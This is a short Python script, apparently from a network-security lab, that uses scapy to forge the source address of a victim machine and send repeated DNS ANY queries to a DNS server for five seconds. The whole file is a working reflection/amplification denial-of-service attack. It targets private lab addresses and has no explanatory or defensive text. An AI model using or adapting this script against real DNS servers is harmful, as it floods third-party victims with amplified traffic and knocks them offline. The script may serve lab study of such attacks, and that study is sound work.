from scapy.all import *
import time

# Target DNS server IP (your local DNS server)
target_dns = "10.9.0.53"

# Spoofed IP of the victim machine (so response goes to them)
victim_ip = "10.9.0.5"

# Duration of attack in seconds
duration = 5

# Start time
start_time = time.time()

print("[*] Sending spoofed DNS queries for", duration, "seconds...")

while time.time() - start_time < duration:
    packet = IP(src=victim_ip, dst=target_dns) / \
             UDP(sport=RandShort(), dport=53) / \
             DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))

    send(packet, verbose=0)

print("[+] Done sending spoofed packets.")
